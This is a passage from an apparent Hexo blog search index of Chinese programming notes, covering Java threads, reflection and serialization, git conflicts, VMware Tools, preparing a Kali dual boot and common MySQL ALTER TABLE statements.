实现同步，锁的是this</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//判断是否有票</span></span><br><span class="line">        <span class="keyword">if</span> (ticketNums &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//模拟延时</span></span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//买票</span></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿到了&quot;</span> + ticketNums--);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的java代码中，锁住的是BuyTicket类型的对象，因为后面需要修改该对象的ticketNums属性值</p>
<p><img src="https://i.loli.net/2021/09/08/wp8AexIsnu2FD9C.png" alt="image-20210908111419823"></p>
<h3 id="线程同步块"><a href="#线程同步块" class="headerlink" title="线程同步块"></a>线程同步块</h3><p>将<strong>需要同步操作的对象</strong>放在参数列表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用到了同步块</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnsafeList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">                    list.add(Thread.currentThread().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码中，list为需要进行同步操作的变量，所以放到了同步块中，以进行同步控制。</p>
<p><img src="https://i.loli.net/2021/09/08/kGnIcedO3ay9TEL.png" alt="image-20210908111454528"></p>
<h3 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h3><p><strong>同步机制中可能会产生死锁，所以需要避免死锁问题</strong></p>
<h4 id="死锁产生的四个必要条件"><a href="#死锁产生的四个必要条件" class="headerlink" title="死锁产生的四个必要条件"></a>死锁产生的四个必要条件</h4><ol>
<li><strong>互斥条件：</strong>一个资源每次只能被一个进程使用</li>
<li><strong>请求与保持条件：</strong>一个进程因请求资源而阻塞时，对已获得的资源保持不放</li>
<li><strong>不剥夺条件：</strong>进程已获得的资源，在未使用完之前，不能强行剥夺</li>
<li><strong>循环等待条件：</strong>若干进程之间形成一种头尾相接的循环等待资源关系</li>
</ol>
<h4 id="死锁解决方法"><a href="#死锁解决方法" class="headerlink" title="死锁解决方法"></a>死锁解决方法</h4><p><strong>只要破坏上面四个条件中的任意一个就行</strong></p>
<h3 id="Lock接口"><a href="#Lock接口" class="headerlink" title="Lock接口"></a>Lock接口</h3><h4 id="ReentratLock实现类（可重入锁）"><a href="#ReentratLock实现类（可重入锁）" class="headerlink" title="ReentratLock实现类（可重入锁）"></a>ReentratLock实现类（可重入锁）</h4><p><img src="https://i.loli.net/2021/09/08/jpUMN5nkBtch9D6.png" alt="image-20210908143622156"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> syn.Lock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLock</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestLock2 testLock2 = <span class="keyword">new</span> TestLock2();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(testLock2).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestLock2</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tickNums = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义lock锁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                lock.lock();    <span class="comment">//加锁</span></span><br><span class="line">                <span class="keyword">if</span> (tickNums &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(tickNums--);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();  <span class="comment">//解锁</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h3><h4 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h4><h4 id="信号灯法："><a href="#信号灯法：" class="headerlink" title="信号灯法："></a>信号灯法：</h4><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><h3 id="线程池的作用"><a href="#线程池的作用" class="headerlink" title="线程池的作用"></a>线程池的作用</h3><p>提前创建好多个线程，放入线程池中，使用时直接获取，使用完返回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</p>
<h3 id="线程池API"><a href="#线程池API" class="headerlink" title="线程池API"></a>线程池API</h3><ul>
<li>JDK5提供了线程池相关的API：<strong>ExecutorService</strong>和<strong>Executors</strong></li>
<li>ExecutorService：真正的线程池接口。常见子类ThreadPoolExecutor<ul>
<li>void execute（Runnable command）：执行任务/命令，没有返回值，一般用来执行Runnable</li>
<li><T> Future<T> submit（Callable<T> task）：执行任务，有返回值，一般用来执行Callable</li>
<li>void shutdown（）:关闭连接池</li>
</ul>
</li>
<li>Executors：工具类、线程池的工厂类，用于创建并返回不同类型的线程池</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> threadsPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试线程池</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.创建服务，创建线程池</span></span><br><span class="line">        <span class="comment">//newFixedThreadPool 参数为：线程池大小</span></span><br><span class="line">        ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line">        service.execute(<span class="keyword">new</span> MyThread());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.关闭连接</span></span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/09/ZPcUkoIGBT6xY1a.png" alt="image-20210909155310355"></p>
]]></content>
      <tags>
        <tag>Thread</tag>
        <tag>创建线程</tag>
        <tag>线程五状态</tag>
        <tag>线程同步机制</tag>
      </tags>
  </entry>
  <entry>
    <title>学习笔记——java中的注解和反射</title>
    <url>/2021/08/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94java%E4%B8%AD%E7%9A%84%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><span id="more"></span>

<p>对于每个类而言，JRE都会为其保留一个不变的Class类型的对象。一个Class对象包含了特定的结构（class、interface、enum、annotation、primitive type、void）等相关的信息</p>
<ul>
<li><strong>class本身也是一个类</strong></li>
<li><strong>Class对象只能由系统建立对象</strong></li>
<li><strong>一个Class对象对应的是一个加载到JVM中的一个class文件</strong></li>
<li><strong>每个类的实例都会记得自己是由哪个Class实例所生成</strong></li>
<li><strong>通过Class可以完整地得到一个类中所有被加载的结构</strong></li>
<li><strong>Class类是Reflection的根源，针对任何你想动态加载、运行的类，唯有获得相应的Class对象</strong></li>
</ul>
<h2 id="对象的创建过程本质"><a href="#对象的创建过程本质" class="headerlink" title="对象的创建过程本质"></a>对象的创建过程本质</h2><p>java中的对象主要分为两种：一种是普通类创建的实例对象；另一种是Class对象（只能有系统创建）。其实<strong>Java中的实例对象就是通过Class对象来创建的</strong></p>
<h2 id="获取class对象的方式"><a href="#获取class对象的方式" class="headerlink" title="获取class对象的方式"></a>获取class对象的方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test03</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;学生&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">方式</th>
<th align="left">代码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">通过对象获得</td>
<td align="left">Class aClass = person.getClass();<br /> System.out.println(aClass.hashCode());</td>
</tr>
<tr>
<td align="center">forName获得</td>
<td align="left">Class aClass1 = Class.forName(“Student”);<br /> System.out.println(aClass1.hashCode());</td>
</tr>
<tr>
<td align="center">通过类名获得</td>
<td align="left">Class aClass2 = Student.class;<br /> System.out.println(aClass2.hashCode());</td>
</tr>
<tr>
<td align="center">基本内置类型的包装类都有一个Type属性</td>
<td align="left">Class aClass3 = Integer.TYPE; <br />System.out.println(aClass3);</td>
</tr>
<tr>
<td align="center">获得父类类型</td>
<td align="left">Class aClass4 = aClass1.getSuperclass(); <br />System.out.println(aClass4.hashCode());</td>
</tr>
</tbody></table>
<p><strong>上三个输出的哈希值是相等的（打印顺序与上面一一对应）：</strong></p>
<p><img src="https://i.loli.net/2021/08/18/2wJ5qBu8IOorhld.png" alt="image-20210818171226626"></p>
]]></content>
      <tags>
        <tag>java创建对象</tag>
        <tag>获取class对象</tag>
      </tags>
  </entry>
  <entry>
    <title>导入项目，出现中文乱码</title>
    <url>/2021/08/08/%E5%AF%BC%E5%85%A5%E9%A1%B9%E7%9B%AE%EF%BC%8C%E5%87%BA%E7%8E%B0%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<h2 id="导入项目的时候，出现中文乱码"><a href="#导入项目的时候，出现中文乱码" class="headerlink" title="导入项目的时候，出现中文乱码"></a>导入项目的时候，出现中文乱码</h2><span id="more"></span>

<h4 id="问题：中文出现乱码"><a href="#问题：中文出现乱码" class="headerlink" title="问题：中文出现乱码"></a>问题：中文出现乱码</h4><blockquote>
<p>​    在导入其他人项目的时候，有时候会出现中文乱码的错误</p>
</blockquote>
<h4 id="解决方案：修改MyEclipse的字符编码格式"><a href="#解决方案：修改MyEclipse的字符编码格式" class="headerlink" title="解决方案：修改MyEclipse的字符编码格式"></a>解决方案：修改MyEclipse的字符编码格式</h4><p><img src="https://i.loli.net/2021/08/13/EIKfDFC4RQN9nAg.png" alt="屏幕截图 2021-08-08 181421"></p>
<p><img src="https://i.loli.net/2021/08/13/4xhuGtLqykF1NYf.png" alt="QQ图片20210808181515"></p>
<p>上面字符编码格式改为本身的编码格式</p>
]]></content>
      <tags>
        <tag>中文乱码</tag>
      </tags>
  </entry>
  <entry>
    <title>安装VMwareTools</title>
    <url>/2023/06/23/%E5%AE%89%E8%A3%85VMwareTools/</url>
    <content><![CDATA[<h2 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h2><span id="more"></span>

<p>VMware Tools可以实现windows和linux之间的复制粘贴</p>
<p>VMware Tools的安装代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install open-vm-tools-desktop -y</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>git pull和git push发生冲突</title>
    <url>/2023/02/16/git%20pull%E5%92%8Cgit%20push%E5%8F%91%E7%94%9F%E5%86%B2%E7%AA%81/</url>
    <content><![CDATA[<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>git pull发生冲突：首先 git pull = git fetch + git merge，所有只要执行git pull即可（在此之前，需要将有冲突的文件执行git add . 和 git commit -m “备注”，该命令也为了保存自己做了哪些修改）；然后比较不同之处，手动进行最终修改即可。</li>
<li>git push冲突：首先执行git pull，合并后，手动修改，决定最终要留的内容版本，然后重新执行git add . 和git commit -m “备注”</li>
<li>如果时git push，还可以考虑使用git pull –rebase进行变基，来强行将远程仓库的内容换到本地工作区。</li>
</ul>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>小新在windows10上安装kali双系统</title>
    <url>/2021/06/08/%E5%B0%8F%E6%96%B0%E5%9C%A8windows10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><span id="more"></span>

<ol>
<li>腾出一个分区（此步骤可以放到最后去做）</li>
<li>kali镜像文件</li>
<li>帮助格式化和创建可引导USB闪存盘的工具：Rufus（建议直接在官网下载，也可以使用其他工具）</li>
<li> U盘（8G以上，用于担当第二步的启动盘）</li>
</ol>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h3 id="第一步：下载kali镜像文件"><a href="#第一步：下载kali镜像文件" class="headerlink" title="第一步：下载kali镜像文件"></a>第一步：下载kali镜像文件</h3><ul>
<li>下载地址：<a href="https://mirrors.cloud.tencent.com/">腾讯软件源</a></li>
</ul>
<ul>
<li>进入其中后，找到想要安装的系统（我安装的是kali）<br><img src="https://i.loli.net/2021/06/08/nFlYvH9jQAWyTPD.png" alt="1.png"></li>
<li>选择想要下载版本<br><img src="https://i.loli.net/2021/06/08/ScBTMGYtQfe6Lox.png" alt="2.png"><br><img src="https://i.loli.net/2021/06/08/be2yF86HOcXupAi.png" alt="3.png"></li>
</ul>
<h3 id="第二步：下载Rufus软件"><a href="#第二步：下载Rufus软件" class="headerlink" title="第二步：下载Rufus软件"></a>第二步：下载Rufus软件</h3><ul>
<li>下载地址：<a href="https://rufus.en.softonic.com/download">Rufus</a>（注意留心一下下载的是否是Rufus）<br><img src="https://i.loli.net/2021/06/08/6IHjQ51l4yXUAbC.png" alt="4.png"></li>
</ul>
<h3 id="第三步：制作启动U盘"><a href="#第三步：制作启动U盘" class="headerlink" title="第三步：制作启动U盘"></a>第三步：制作启动U盘</h3><ol>
<li>打开下载好的Rufus<br><img src="https://i.loli.net/2021/06/08/HTLQY5zCsFGBgNw.png" alt="5.png"></li>
<li>①处会自动识别出电脑中的U盘<br>②处选择第一步中下载好的镜像文件<br>点击③处的开始<br><img src="https://i.loli.net/2021/06/08/1uTJPcrgxW7qdh9.png" alt="6.png"></li>
<li>在下面的图片中选择第二个（否则，后面可能找不到启动U盘）<br><img src="https://i.loli.net/2021/06/08/YSNxpogmcQL54Mi.png" alt="7.png"></li>
</ol>
<h3 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h3><ol>
<li>进入控制面板<br><img src="https://i.loli.net/2021/06/08/QJkTiyUZfojElts.png" alt="8.png"></li>
<li>按照下面的步骤依次操作<br><img src="https://i.loli.net/2021/06/08/Hity41vR2ej6LFC.png" alt="9.png"></li>
<li>进入到磁盘管理界面，选择需要分盘的盘符，右击-&gt;<br><img src="https://i.loli.net/2021/06/08/q5A4SyZLXnf3N2g.png" alt="10.png"></li>
<li>根据需要输入大小-&gt;压缩<br><img src="https://i.loli.net/2021/06/08/ypHz9oXc4MTegYS.png" alt="11.png"></li>
<li>在如下图中新出现的位置右击-&gt;新建简单券<br><img src="https://i.loli.net/2021/06/08/2QzbU3ZIlExNdwc.png" alt="12.png"></li>
<li>一直下一步,直到完成(除了下图中的位置需要根据需要设置)<br><img src="https://i.loli.net/2021/06/08/KDdwISRWX3l1Y72.png" alt="13.png"></li>
<li>分区结束</li>
</ol>
]]></content>
      <tags>
        <tag>双系统</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化和反序列化</title>
    <url>/2021/11/01/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p><strong>序列化：</strong>把Java对象转换为字节序列的过程</p>
<p><strong>反序列化：</strong>把自己序列恢复为Java对象的过程</p>
<h3 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h3><ol>
<li><strong>便于存储：</strong>可以吧对象的字节序列永久保存到硬盘上（如果放内存中，则会消失）</li>
<li><strong>便于传输：</strong>在网络上传送对象的字节序列</li>
<li><strong>附加：</strong>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中重建对象</li>
</ol>
<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><p>由于整个过程都是在Java虚拟机（JVM）上运行的，独立于电脑的操作系统，所以，<strong>在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象，在内存中重建对象</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>核心作用就是对象状态的保存和重建。（整个过程的核心点：<strong>字节流中的所保存的对象状态及描述信息</strong>）</p>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p><strong>条件：</strong>被序列化的对象的类必须实现接口 java.io.Serializable</p>
<h3 id="JDK中序列化和反序列化的API"><a href="#JDK中序列化和反序列化的API" class="headerlink" title="JDK中序列化和反序列化的API"></a>JDK中序列化和反序列化的API</h3><p><strong>①java.io.ObjectInputStream：对象输入流。</strong></p>
<p>该类的readObject()方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回。</p>
<p><strong>②java.io.ObjectOutputStream：对象输出流。</strong></p>
<p>该类的writeObject(Object obj)方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出。</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>主要有两步骤：</p>
<ol>
<li><strong>创建一个对象输出流</strong>，它可以包装一个其他类型的目标输出流，如文件输出流</li>
<li><strong>通过ObjectOutputStream对象输入流的writeObject()方法写对象</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;text.txt&quot;</span>);       <span class="comment">//对象序列化保存的位置</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);   <span class="comment">//需要使用ObjectOutputStream对象</span></span><br><span class="line">        objectOutputStream.writeObject(person);         <span class="comment">//使用writeObject()方法将对象序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<p><strong>注意！！！：如对象中有非基本类型属性，则该属性的类也需要实现Serializable接口</strong></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>主要有两步骤：</p>
<ol>
<li><strong>创建一个对象输入流</strong>，它可以包装一个其他类型的源输入流，如文件输入流</li>
<li><strong>通过ObjectOutputStream对象输入流的readObject()方法读取对象</strong></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;text.txt&quot;</span>);       <span class="comment">//被反序列化的对象的存储位置</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);   <span class="comment">//需要用到ObjectInputStream对象</span></span><br><span class="line">        person = (Person) objectInputStream.readObject();       <span class="comment">//反序列化对象的字节码</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>序列化和反序列化</tag>
        <tag>IO流</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库常用sql语句</title>
    <url>/2021/10/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8sql%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><span id="more"></span>

<h3 id="常用SQL语句"><a href="#常用SQL语句" class="headerlink" title="常用SQL语句"></a>常用SQL语句</h3><p>MySQL中常用的SQL语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1 ALTER TABLE：添加，修改，删除表的列，约束等表的定义。     </span><br><span class="line"> 2 查看列：desc 表名;  </span><br><span class="line"> 3 修改表名：alter table t_book rename to bbb;  </span><br><span class="line"> 4 添加列：alter table 表名 add column 列名 varchar(30);  </span><br><span class="line"> 5 删除列：alter table 表名 drop column 列名;  </span><br><span class="line"> 6 修改列名MySQL： alter table bbb change nnnnn hh int;  </span><br><span class="line"> 7 修改列名SQLServer：exec sp_rename&#39;t_student.name&#39;,&#39;nn&#39;,&#39;column&#39;;  </span><br><span class="line"> 8 修改列名Oracle：lter table bbb rename column nnnnn to hh int;  </span><br><span class="line"> 9 修改列属性：alter table t_book modify name varchar(22);  </span><br><span class="line">10 sp_rename：SQLServer 内置的存储过程，用与修改表的定义。 </span><br><span class="line"> </span><br><span class="line">   添加字段  </span><br><span class="line"> 1 alter table user add COLUMN new1 VARCHAR(20) DEFAULT NULL; &#x2F;&#x2F;增加一个字段，默认为空  </span><br><span class="line"> 2 alter table user add COLUMN new2 VARCHAR(20) NOT NULL;  &#x2F;&#x2F;增加一个字段，默认不能为空</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL 查看约束，添加约束，删除约束 添加列，修改列，删除列  </span><br><span class="line"> 1 查看表的字段信息：desc 表名;  </span><br><span class="line"> 2 查看表的所有信息：show create table 表名;  </span><br><span class="line"> 3 添加主键约束：alter table 表名 add constraint 主键 （形如：PK_表名） primary key 表名(主键字段);  </span><br><span class="line"> 4 添加外键约束：alter table 从表 add constraint 外键（形如：FK_从表_主表） foreign key 从表(外键字段) references 主表(主键字段);  </span><br><span class="line"> 5 删除主键约束：alter table 表名 drop primary key;  </span><br><span class="line"> 6 删除外键约束：alter table 表名 drop foreign key 外键（区分大小写）;  </span><br><span class="line"> 7 修改表名：alter table t_book rename to bbb;  </span><br><span class="line"> 8 添加列：alter table 表名 add column 列名 varchar(30);  </span><br><span class="line"> 9 删除列：alter table 表名 drop column 列名;  </span><br><span class="line">10 修改列名MySQL： alter table bbb change nnnnn hh int;  </span><br><span class="line">11 修改列名SQLServer：exec sp_rename&#39;t_student.name&#39;,&#39;nn&#39;,&#39;column&#39;;  </span><br><span class="line">12 修改列名Oracle：alter table bbb rename column nnnnn to hh int;  </span><br><span class="line">13 修改列属性：alter table t_book modify name varchar(22);  </span><br><span class="line">14 sp_rename：SQLServer 内置的存储过程，用与修改表的定义。  </span><br><span 